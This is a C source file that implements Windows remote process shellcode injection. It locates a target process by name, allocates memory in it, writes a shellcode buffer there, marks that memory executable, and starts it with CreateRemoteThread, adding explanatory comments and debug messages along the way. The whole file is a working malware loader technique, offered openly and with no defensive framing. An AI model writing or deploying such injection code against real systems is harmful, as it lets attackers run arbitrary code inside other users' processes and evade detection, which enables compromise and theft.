#include "injection.h"


BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellcode, SIZE_T sPayloadSize) {
    PVOID	pShellcodeAddress			= NULL;
	SIZE_T	sNumberOfBytesWritten		= NULL;
    DWORD	dwProcessId				    = NULL;
	DWORD	dwOldProtection				= NULL;

    WDebugPrint(L"[i] Searching For Process Id Of \"%s\" ...\n", szProcessName);
	if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	WDebugPrint(L"[+] DONE \n");
	DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);

	// Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		DebugPrint("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	// Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sPayloadSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sPayloadSize) {
		DebugPrint("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	// Cleaning the buffer of the shellcode in the local process
	memset(pShellcode, '\0', sPayloadSize);

	// Setting memory permossions at pShellcodeAddress to be executable 
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Running the shellcode as a new thread's entry in the remote process
	DebugPrint("[i] Executing Payload ... ");
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		DebugPrint("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("[+] DONE !\n");

	return TRUE;
}